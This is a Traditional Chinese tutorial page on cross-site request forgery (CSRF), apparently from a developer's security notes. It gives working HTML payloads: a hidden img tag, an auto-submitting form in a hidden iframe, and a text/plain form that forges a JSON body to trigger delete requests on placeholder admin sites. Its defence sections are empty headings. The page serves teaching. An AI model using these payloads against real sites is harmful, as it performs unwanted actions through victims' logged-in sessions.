# CSRF 跨站偽造請求

CSRF (Cross-site request forgery) 跨站偽造請求，**駭客** 利用使用者在 **A 網** 已驗証的身份，在使用者進入 **第三網 (駭客架設)** 時，發起對 **A 網** 隱藏式的請求指令 **達成指定目的**，而非透過 **使用者** 的意願。
![creativegroundtech](/security/img/cross-site-request-forgery.webp)

> 圖片出處：creativegroundtech

1. 登入 **銀行網**
2. (成功) 取得使用者認證資料
3. 駭客發送 `釣魚網站` 或 `惡意連結` 給使用者
4. 使用者到 **駭客網站** 不知情下，送出了到 **銀行網** 的指令請求
5. 銀行依 2 取得的身份驗証，成功執行請求。

:::tip 瀏覽器機制
當發出 **請求** 給某個網域，其網域關聯的 `cookie` 也會一起被帶上 **請求** 之中，所以駭客就是利用 `cookie`中已驗證的身份，發動攻擊。
:::

## 攻擊方式

### GET

假設後台的 **刪除** 功能，可以直接以 `/delete?id=3` 來刪除 `id=3`的項目。理論上，使用者必須先驗證過個人資料，且在後台操作才會執行 **刪除**。

```html
<a href="/delete?id=3"> 刪除 </a>
```

<table>
  <tr>
    <td>標題</td>
    <td>更新時間</td>
    <td>操作</td>
  </tr>
  <tr>
    <td>這是資料</td>
    <td>2021-12-15</td>
    <td><button>刪除</button></td>
  </tr>
</table>

#### 駭客行為

在使用者已登入過後台的情況下，對你發送 **釣魚網站** 、 **惡意連結**，在惡意網站內或連結中，寫入下面內容 (假設 後台 網址：`https://www.admin.com`)：

- **被動**

  進入網站後 「點擊」 執行 **請求**

  ```html
  <a href="https://www.admin.com/delete?id=3">開始測驗</a>
  ```

  <a>開始測驗</a>

  當你點下時，就是到了 `https://www.admin.com` 且送出了 **DELETE** 指令，刪除了某個東西。

- **主動**

  進入網站時，就 **自動送出請求**

  ```html
  <img src="https://www.admin.com/delete?id=3" width="0" height="0" />
  <a href="/test">開始測驗</a>
  ```

  將 `<img>` 設為 **隱藏**，當網站進入後，就會請求 `url`，在不知情下就被攻擊了。

### POST

如果**刪除功能** 是 ` POST`，駭客也可以使用 `<form>` 來主動提交表單，這是藉由 `<iframe>` 來隱藏 `<form>` 的表單顯示。[stackoverflow](https://stackoverflow.com/questions/17940811/example-of-silently-submitting-a-post-form-csrf)

```html {1,3,4,8,13}
<iframe style="display:none" name="csrf-frame"></iframe>
<form
  method="POST"
  action="https://www.admin.com/delete"
  target="csrf-frame"
  id="csrf-form"
>
  <input type="hidden" name="id" value="3" />
  <input type="submit" value="submit" />
</form>

<script>
  document.getElementById('csrf-form').submit()
</script>
```

> 當進入網站，就送出表單。

### JSON 傳送

常見與後端溝通的 `json` ，也是有機會被攻擊，主要是透過 **字元** 組合達到指定的 `json` 樣式。

```html {4}
<form
  action="https://small-min.blog.com/delete"
  method="post"
  enctype="text/plain"
>
  <input name='{"id":3, "ignore_me":"' value='test"}' type="hidden" />
  <input type="submit" value="delete!" />
</form>
```

會產生這樣的 **請求** body

```js
{
  "id": 3,
  "ignore_me": "=test"
}
```

## 防禦方式

### 前端

### 後端

### 瀏覽器

## Reference

- [讓我們來談談 CSRF](https://blog.techbridge.cc/2017/02/25/csrf-introduction/)
- [全端勇士之路 Node.js 基礎學習-CSRF 篇](https://hsiangfeng.github.io/nodejs/20190704/2336420619/)
- [imperva - Cross site request forgery (CSRF) attack](https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/)
